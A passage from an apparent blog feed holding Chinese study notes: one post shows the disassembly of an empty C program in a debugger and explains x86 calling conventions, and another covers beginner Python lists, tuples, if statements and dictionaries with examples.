      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><p><strong>软件反工程</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>return 0</code> 处打上F9断点，按下F5调试程序，再打开菜单<code>Debug</code>下的<code>Windows</code>子菜单，选择<code>Disassembly</code>（反编译），出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--- f:\root\work\any\t12\t12\t12.c----\</span><br><span class="line">// t12.cpp : Define the entry point for the console application.</span><br><span class="line">//</span><br><span class="line"># include &quot;stadfx.h&quot;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">00411360 push ebp</span><br><span class="line">00411361 mov ebp,esp</span><br><span class="line">00411363 sub esp,0C0h</span><br><span class="line">00411369 push ebx</span><br><span class="line">0041136A push esi</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>函数调用规则</strong></p><p>在Windows上常用规则有Pascal方式、WINAPI方式（_stdcall）、C方式（_cdecl）。</p><p>Pascal调用规则：</p><p>Pascal调用规则主要用在Win16函数库中，现在基本不用。</p><p>1） 参数从左到右进入堆栈；</p><p>2） 被调用的函数在返回前自行清理。</p><p>3） 不支持可变参数的函数调用。</p><p>_stdcall又被称为WINAPI，其调用规则：</p><p>1）参数从右到左进入堆栈；</p><p>2） 被调用的函数在返回前自行清理堆栈，所以生成的代码比cdecl小</p><p>_cdecl C调用规则：</p><p>1） 参数从右到左进入堆栈；</p><p>2） 在函数返回后，调用者负责清楚堆栈，所以这种调用常会生成较大的可执行程序。</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python_Learning</title>
      <link href="/2018/11/18/Python-Learning-1/"/>
      <url>/2018/11/18/Python-Learning-1/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>《Python编程从入门到实践》——【美】Eric Matthes 著 袁国忠 译</p><p>由于Python2已经停止更新，所以尽量用Python3开始编程。</p><p>这是第一部分</p><a id="more"></a><h2 id="变量的命名和使用"><a href="#变量的命名和使用" class="headerlink" title="变量的命名和使用"></a>变量的命名和使用</h2><ul><li>变量名只能包含字母、数字和下划线。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为message_1，但不能将其命名为1_message。</li><li>变量名不能包含空格，但可使用下划线来分隔其中的单词。例如，变量名greeting_message可行，但变量名greeting message会引发错误。</li><li>不要将Python关键字和函数名用作变量名，即不要使用Python保留用于特殊用途的单词，如print （请参见附录A.4）。</li><li>变量名应既简短又具有描述性。例如，name比n好，student_name比s_n好，name_length比length_of_persons_name好。</li><li>慎用小写字母l和大写字母O，因为它们可能被人错看成数字1和0。</li></ul><p><strong>方法</strong>是Python可对数据执行的操作，每个方法跟着一对（），因为方法通常都需要额外的信息来完成其工作。例如：name.title( )就是首字母大写显示name，无论单词内部是否大写。name.upper( )/name.lower( )。删除空白：name.lstrip()和rstrip( )的方法（头尾）。</p><p>注释：</p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bicycles = [<span class="string">'trek'</span>, <span class="string">'cannondale'</span>, <span class="string">'redline'</span>, <span class="string">'specialized'</span>]</span><br></pre></td></tr></table></figure><p>列表是有序集合，访问列表的任何元素，只需该元素的位置或索引，并将其放在方括号内。（索引从0开始），为访问最后一个元素提供-1的索引。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bicycles[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>同样可以调用字符串功能。</p><p><strong>修改：</strong>直接索引位置修改。</p><p><strong>添加：</strong></p><ol><li>append()添加到末尾。</li><li>insert()添加到索引之前。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">motorcycles = [<span class="string">'honda'</span>, <span class="string">'yamaha'</span>, <span class="string">'suzuki'</span>]</span><br><span class="line">motorcycles.insert(<span class="number">1</span>, <span class="string">'ducati'</span>)</span><br><span class="line">print(motorcycles)</span><br></pre></td></tr></table></figure></li></ol><p><code>[&#39;honda&#39;, &#39;ducati&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;]</code></p><p><strong>删除：</strong></p><ol><li>del name[0]</li><li>pop()：方法pop() 可删除列表末尾的元素，并让你能够接着使用它。术语弹出 （pop）源自这样的类比：列表就像一个栈，而删除列表末尾的元素相当于弹出栈顶元素。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">motorcycles = [<span class="string">'honda'</span>, <span class="string">'yamaha'</span>, <span class="string">'suzuki'</span>]</span><br><span class="line">popped_motorcycle = motorcycles.pop()</span><br><span class="line">print(motorcycles)</span><br><span class="line">print(popped_motorcycle)</span><br></pre></td></tr></table></figure></li></ol><p><code>[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;]</code><br><code>[&#39;honda&#39;, &#39;yamaha&#39;]</code><br><code>suzuki</code></p><p>实际pop()可以来删除列表中任何位置的元素，需在括号中指定元素的索引。</p><ol><li>根据删除的元素的值，可使用方法remove() 。使用remove() 从列表中删除元素时，也可接着使用它的值。方法remove() 只删除第一个指定的值。如果要删除的值可能在列表中出现多次，就需要使用循环来判断是否删除了所有这样的值。</li></ol><p><strong>组织列表</strong></p><ul><li>sort()对列表进行永久排序</li><li>sorted()对列表进行临时排序<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cars = [<span class="string">'bmw'</span>, <span class="string">'audi'</span>, <span class="string">'toyota'</span>, <span class="string">'subaru'</span>]</span><br><span class="line">print(<span class="string">"Here is the original list:"</span>,<span class="string">"     "</span>,cars)</span><br><span class="line">print(<span class="string">"Here is the sorted() list:"</span>,<span class="string">"     "</span>,sorted(cars))</span><br><span class="line">print(<span class="string">"Here is the original list again:"</span>,cars)</span><br><span class="line">cars.sort()</span><br><span class="line">print(<span class="string">"Here is the sort() list again:"</span>,<span class="string">" "</span>,cars)</span><br><span class="line">print(<span class="string">"Here is the original list again:"</span>,cars)</span><br></pre></td></tr></table></figure></li></ul><p><code>Here is the original list:       [&#39;bmw&#39;, &#39;audi&#39;, &#39;toyota&#39;, &#39;subaru&#39;]</code><br><code>Here is the sorted() list:       [&#39;audi&#39;, &#39;bmw&#39;, &#39;subaru&#39;, &#39;toyota&#39;]</code><br><code>Here is the original list again: [&#39;bmw&#39;, &#39;audi&#39;, &#39;toyota&#39;, &#39;subaru&#39;]</code><br><code>Here is the sort() list again:   [&#39;audi&#39;, &#39;bmw&#39;, &#39;subaru&#39;, &#39;toyota&#39;]</code><br><code>Here is the original list again: [&#39;audi&#39;, &#39;bmw&#39;, &#39;subaru&#39;, &#39;toyota&#39;]</code></p><p><strong>倒序打印：</strong>reverse()</p><p><strong>确定列表长度：</strong>len()</p><h2 id="操作列表"><a href="#操作列表" class="headerlink" title="操作列表"></a>操作列表</h2><p><strong>遍历整个列表：</strong>for i in X:</p><p><em>i 的选择</em>：编写for 循环时，对于用于存储列表中每个值的临时变量，可指定任何名称。然而，选择描述单个列表元素的有意义的名称大有帮助。</p><p>for循环用法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magicians = [<span class="string">'alice'</span>, <span class="string">'david'</span>, <span class="string">'carolina'</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magicians:</span><br><span class="line">    print(magician.title() + <span class="string">", that was a great trick!"</span>)</span><br><span class="line">    print(<span class="string">"I can't wait to see your next trick, "</span> + magician.title() + <span class="string">".\n"</span>)</span><br></pre></td></tr></table></figure></p><p><code>Alice, that was a great trick!</code><br><code>I can&#39;t wait to see your next trick, Alice.</code></p><p><code>David, that was a great trick!</code><br><code>I can&#39;t wait to see your next trick, David.</code><br><code>`</code>Carolina, that was a great trick!<code>`I can&#39;t wait to see your next trick, Carolina.</code></p><p><strong>创建数字列表</strong><br>range()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure><p><code>1</code><br><code>2</code><br><code>3</code><br><code>4</code><br>函数range() 让Python从你指定的第一个值开始数，并在到达你指定的第二个值后停止，因此输出不包含第二个值（这里为5）。</p><p>range(2,11,2)：函数range() 从2开始数，然后不断地加2，直到达到或超过终值（11），</p><p>list(range(x,y))创建数字列表</p><p><strong>使用列表的一部分</strong></p><p><strong>切片</strong></p><ul><li>要创建切片，可指定要使用的第一个元素和最后一个元素的索引[X:Y]。与函数range() 一样，Python在到达你指定的第二个索引前面的元素后停止。</li><li>如果你没有指定第一个索引，Python将自动从列表开头开始：</li><li>要让切片终止于列表末尾，也可使用类似的语法。</li><li>负数索引返回离列表末尾相应距离的元素，因此你可以输出列表末尾的任何切片。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">players = [<span class="string">'charles'</span>, <span class="string">'martina'</span>, <span class="string">'michael'</span>, <span class="string">'florence'</span>, <span class="string">'eli'</span>]</span><br><span class="line">print(players[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">print(players[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line">print(players[:<span class="number">4</span>])</span><br><span class="line">print(players[<span class="number">2</span>:])</span><br><span class="line">print(players[<span class="number">-3</span>:])</span><br></pre></td></tr></table></figure><p><code>[&#39;charles&#39;, &#39;martina&#39;, &#39;michael&#39;]</code><br><code>[&#39;martina&#39;, &#39;michael&#39;, &#39;florence&#39;]</code><br><code>[&#39;charles&#39;, &#39;martina&#39;, &#39;michael&#39;, &#39;florence&#39;]</code><br><code>[&#39;michael&#39;, &#39;florence&#39;, &#39;eli&#39;]</code><br><code>[&#39;michael&#39;, &#39;florence&#39;, &#39;eli&#39;]</code></p><p><strong>遍历切片</strong> for X in rang[:3]</p><p><strong>复制列表</strong><br>创建一个包含整个列表的切片（是同时省略起始索引和终止索引（[:] ），创建一个始于第一个元素，终止于最后一个元素的切片，即复制整个列表。）</p><p><em>简单地将my_foods 赋给friend_foods ，就不能得到两个列表</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">my_foods = [<span class="string">'pizza'</span>, <span class="string">'falafel'</span>, <span class="string">'carrot cake'</span>]</span><br><span class="line"></span><br><span class="line">friend_foods = my_foods[:]</span><br><span class="line">my_foods.append(<span class="string">'cannoli'</span>)</span><br><span class="line">friend_foods.append(<span class="string">'ice cream'</span>)</span><br><span class="line">print(<span class="string">"My favorite foods are:"</span>)</span><br><span class="line">print(my_foods)</span><br><span class="line">print(<span class="string">"My friend's favorite foods are:"</span>)</span><br><span class="line">print(friend_foods,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这行不通</span></span><br><span class="line">friend_foods = my_foods</span><br><span class="line">my_foods.append(<span class="string">'cannoli'</span>)</span><br><span class="line">friend_foods.append(<span class="string">'ice cream'</span>)</span><br><span class="line">print(<span class="string">"My favorite foods are:"</span>)</span><br><span class="line">print(my_foods)</span><br><span class="line">print(<span class="string">"My friend's favorite foods are:"</span>)</span><br><span class="line">print(friend_foods)</span><br></pre></td></tr></table></figure><p><code>My favorite foods are:</code><br><code>[&#39;pizza&#39;, &#39;falafel&#39;, &#39;carrot cake&#39;, &#39;cannoli&#39;]</code><br><code>My friend&#39;s favorite foods are:</code><br><code>[&#39;pizza&#39;, &#39;falafel&#39;, &#39;carrot cake&#39;, &#39;ice cream&#39;]</code></p><p><code>My favorite foods are:</code><br><code>[&#39;pizza&#39;, &#39;falafel&#39;, &#39;carrot cake&#39;, &#39;cannoli&#39;, &#39;cannoli&#39;, &#39;ice cream&#39;]</code><br><code>My friend&#39;s favorite foods are:</code><br><code>[&#39;pizza&#39;, &#39;falafel&#39;, &#39;carrot cake&#39;, &#39;cannoli&#39;, &#39;cannoli&#39;, &#39;ice cream&#39;]</code></p><p><strong>元祖</strong></p><p>列表非常适合用于存储在程序运行期间可能变化的数据集。列表是可以修改的，这对处理网站的用户列表或游戏中的角色列表至关重要。然而，有时候你需要创建一系列不可修改的元素，元组可以满足这种需求。Python将不能修改的值称为不可变的 ，而不可变的列表被称为<strong>元组</strong> 。</p><p>元组看起来犹如列表，但使用圆括号而不是方括号来标识。</p><p>dimensions = (200, 50)</p><p><strong>修改元组变量</strong></p><p>虽然不能修改元组的元素，但可以给存储元组的变量赋值。因此，如果要修改前述矩形的尺寸，可重新定义整个元组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dimensions = (<span class="number">200</span>, <span class="number">50</span>)</span><br><span class="line">print(<span class="string">"Original dimensions:"</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    print(dimension)</span><br><span class="line">dimensions = (<span class="number">400</span>, <span class="number">100</span>)</span><br><span class="line">print(<span class="string">"\nModified dimensions:"</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    print(dimension)</span><br></pre></td></tr></table></figure><p><code>Original dimensions:</code><br><code>200</code><br><code>50</code></p><p><code>Modified dimensions:</code><br><code>400</code><br><code>100</code></p><p><strong>格式设置指南</strong></p><p>若要提出Python语言修改建议，需要编写Python改进提案 （Python Enhancement Proposal，PEP）。PEP 8是最古老的PEP之一，它向Python程序员提供了代码格式设置指南。PEP 8的篇幅很长，但大都与复杂的编码结构相关。<br><a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="noopener">PEP 8</a></p><h2 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h2><p>每条if 语句的核心都是一个值为True 或False 的表达式，这种表达式被称为<strong>条件测试</strong>。</p><ul><li>检查是否相等</li><li>检查是否相等时考虑大小写，若想忽略大小写合理运用X.lower()</li><li>检查是否不相等！=</li><li>比较数字</li><li>检查多个条件 X&gt;2 and/or Y&lt;4</li><li>检查特定值是否包含在列表中 in </li><li>检查特定值是否不包含在列表中 not in </li><li>布尔表达式</li></ul><p><strong>简单if语句</strong></p><p><strong>if-elae语句</strong></p><p><strong>iif-elif-else语句</strong></p><p><strong>使用多个elif语句</strong></p><p><strong>省略else语句</strong></p><p><strong>测试多个条件</strong></p><p><strong>使用if语句处理列表</strong></p><p><strong>使用多个列表</strong></p><p><strong>设置if 语句的格式</strong></p><p>在条件测试的格式设置方面，PEP 8提供的唯一建议是，在诸如== 、&gt;= 和&lt;= 等比较运算符两边各添加一个空格，例如，if age &lt; 4: 要比if age&lt;4: 好。这样的空格不会影响Python对代码的解读，而只是让代码阅读起来更容易。</p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>在Python中，字典 是一系列<strong>键—值</strong>对 。每个<strong>键</strong>都与一个值相关联，你可以使用键来访问与之相关联的值。与键相关联的值可以是数字、字符串、列表乃至字典。事实上，可将任何Python对象用作字典中的值。</p><p>在Python中，字典用放在花括号{ } 中的一系列键—值对表示，如前面的示例所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">'color'</span>: <span class="string">'green'</span>, <span class="string">'points'</span>: <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>键—值</strong>对是两个相关联的值。指定键时，Python将返回与之相关联的值。键和值之间用冒号分隔，而键—值对之间用逗号分隔。</p><p><strong>访问字典中的值</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">'color'</span>: <span class="string">'green'</span>&#125;</span><br><span class="line">print(alien_0[<span class="string">'color'</span>])</span><br></pre></td></tr></table></figure></p><p><code>green</code></p><p><strong>添加键值对</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">'color'</span>: <span class="string">'green'</span>, <span class="string">'points'</span>: <span class="number">5</span>&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line">alien_0[<span class="string">'x_position'</span>] = <span class="number">0</span></span><br><span class="line">alien_0[<span class="string">'y_position'</span>] = <span class="number">25</span></span><br><span class="line">print(alien_0)</span><br></pre></td></tr></table></figure></p><p><code>{&#39;color&#39;: &#39;green&#39;, &#39;points&#39;: 5}</code><br><code>{&#39;color&#39;: &#39;green&#39;, &#39;points&#39;: 5, &#39;x_position&#39;: 0, &#39;y_position&#39;: 25}</code></p><p><strong>创建一个空字典</strong></p><p><strong>修改字典中的值</strong></p><p>要修改字典中的值，可依次指定字典名、用方括号括起的键以及与该键相关联的新值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">'color'</span>: <span class="string">'green'</span>&#125;</span><br><span class="line">print(<span class="string">"The alien is "</span> + alien_0[<span class="string">'color'</span>] + <span class="string">"."</span>)</span><br><span class="line">alien_0[<span class="string">'color'</span>] = <span class="string">'yellow'</span></span><br><span class="line">print(<span class="string">"The alien is now "</span> + alien_0[<span class="string">'color'</span>] + <span class="string">"."</span>)</span><br></pre></td></tr></table></figure></p><p><code>The alien is green.</code><br><code>The alien is now yellow.</code></p><p>例程：对一个能够以不同速度移动的外星人的位置进行跟踪。为此，我们将存储该外星人的当前速度，并据此确定该外星人将向右移动多远：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">'x_position'</span>: <span class="number">0</span>, <span class="string">'y_position'</span>: <span class="number">25</span>, <span class="string">'speed'</span>: <span class="string">'medium'</span>&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Original x-position: "</span> + str(alien_0[<span class="string">'x_position'</span>]))</span><br><span class="line"><span class="comment"># 向右移动外星人</span></span><br><span class="line"><span class="comment"># 据外星人当前速度决定将其移动多远</span></span><br><span class="line"><span class="keyword">if</span> alien_0[<span class="string">'speed'</span>] == <span class="string">'slow'</span>:</span><br><span class="line">    x_increment = <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> alien_0[<span class="string">'speed'</span>] == <span class="string">'medium'</span>:</span><br><span class="line">    x_increment = <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># 这个外星人的速度一定很快</span></span><br><span class="line">    x_increment = <span class="number">3</span></span><br><span class="line"><span class="comment"># 新位置等于老位置加上增量</span></span><br><span class="line">alien_0[<span class="string">'x_position'</span>] = alien_0[<span class="string">'x_position'</span>] + x_increment</span><br><span class="line">print(<span class="string">"New x-position: "</span> + str(alien_0[<span class="string">'x_position'</span>]))</span><br></pre></td></tr></table></figure><p><code>Original x-position: 0</code><br><code>New x-position: 2</code></p><p><strong>删除键-值对</strong></p><p>对于字典中不再需要的信息，可使用del 语句将相应的键—值对彻底删除。使用del 语句时，必须指定字典名和要删除的键。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">'color'</span>: <span class="string">'green'</span>, <span class="string">'points'</span>: <span class="number">5</span>&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line"><span class="keyword">del</span> alien_0[<span class="string">'points'</span>]</span><br><span class="line">print(alien_0)</span><br></pre></td></tr></table></figure></p><p><code>{&#39;color&#39;: &#39;green&#39;, &#39;points&#39;: 5}</code><br><code>{&#39;color&#39;: &#39;green&#39;}</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">'jen'</span>: <span class="string">'python'</span>,</span><br><span class="line">    <span class="string">'sarah'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'edward'</span>: <span class="string">'ruby'</span>,</span><br><span class="line">    <span class="string">'phil'</span>: <span class="string">'python'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">print(<span class="string">"Sarah's favorite language is "</span> +</span><br><span class="line">    favorite_languages[<span class="string">'sarah'</span>].title() +</span><br><span class="line">     <span class="string">"."</span>)</span><br></pre></td></tr></table></figure><p><code>Sarah&#39;s favorite language is C.</code></p><p><strong>遍历字典</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user_0 = &#123;</span><br><span class="line">    <span class="string">'username'</span>: <span class="string">'efermi'</span>,</span><br><span class="line">    <span class="string">'first'</span>: <span class="string">'enrico'</span>,</span><br><span class="line">    <span class="string">'last'</span>: <span class="string">'fermi'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    print(<span class="string">"\nKey: "</span> + key)</span><br><span class="line">    print(<span class="string">"Value: "</span> + value)</span><br></pre></td></tr></table></figure></p><p><code>Key: username</code><br><code>Value: efermi</code></p><p><code>Key: first</code><br><code>Value: enrico</code></p><p><code>Key: last</code><br><code>Value: fermi</code></p><p>要编写用于遍历字典的for 循环，可声明两个变量，用于存储键—值对中的键和值。对于这两个变量，可使用任何名称。下面的代码使用了简单的变量名，<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> user_0.items()</span><br></pre></td></tr></table></figure></p><p>注意，即便遍历字典时，键—值对的返回顺序也与存储顺序不同。Python不关心键—值对的存储顺序，而只跟踪键和值之间的关联关系。</p><p><strong>遍历字典中的所有键</strong></p><p>在不需要使用字典中的值时，方法keys() 很有用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">'jen'</span>: <span class="string">'python'</span>,</span><br><span class="line">    <span class="string">'sarah'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'edward'</span>: <span class="string">'ruby'</span>,</span><br><span class="line">    <span class="string">'phil'</span>: <span class="string">'python'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">    print(name.title())</span><br></pre></td></tr></table></figure></p><p><code>Jen</code><br><code>Sarah</code><br><code>Edward</code><br><code>Phil</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">'jen'</span>: <span class="string">'python'</span>,</span><br><span class="line">    <span class="string">'sarah'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'edward'</span>: <span class="string">'ruby'</span>,</span><br><span class="line">    <span class="string">'phil'</span>: <span class="string">'python'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">friends = [<span class="string">'phil'</span>, <span class="string">'sarah'</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">    print(name.title())</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> friends:</span><br><span class="line">        print(<span class="string">" Hi "</span> + name.title() +</span><br><span class="line">                <span class="string">", I see your favorite language is "</span> +</span><br><span class="line">                favorite_languages[name].title() + <span class="string">"!"</span>)</span><br><span class="line">print(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'erin'</span> <span class="keyword">not</span> <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">    print(<span class="string">"Erin, please take our poll!"</span>)</span><br></pre></td></tr></table></figure><p><code>Jen</code><br><code>Sarah</code><br><code>Hi Sarah, I see your favorite language is C!</code><br><code>Edward</code><br><code>Phil</code><br><code>Hi Phil, I see your favorite language is Python!</code></p><p><code>Erin, please take our poll!</code></p><p><strong>按顺序遍历字典中的所有键</strong></p><p>在for 循环中对返回的键进行排序。为此，可使用函数sorted() 来获得按特定顺序排列的键列表的副本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">'jen'</span>: <span class="string">'python'</span>,</span><br><span class="line">    <span class="string">'sarah'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'edward'</span>: <span class="string">'ruby'</span>,</span><br><span class="line">    <span class="string">'phil'</span>: <span class="string">'python'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> sorted(favorite_languages.keys()):</span><br><span class="line">    print(name.title() + <span class="string">", thank you for taking the poll."</span>)</span><br></pre></td></tr></table></figure></p><p><code>Edward, thank you for taking the poll.</code><br><code>Jen, thank you for taking the poll.</code><br><code>Phil, thank you for taking the poll.</code><br><code>Sarah, thank you for taking the poll.</code></p><p><strong>遍历字典中的所有值</strong><br>字典包含的值，可使用方法values() ，它返回一个值列表，而不包含任何键。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">'jen'</span>: <span class="string">'python'</span>,</span><br><span class="line">    <span class="string">'sarah'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'edward'</span>: <span class="string">'ruby'</span>,</span><br><span class="line">    <span 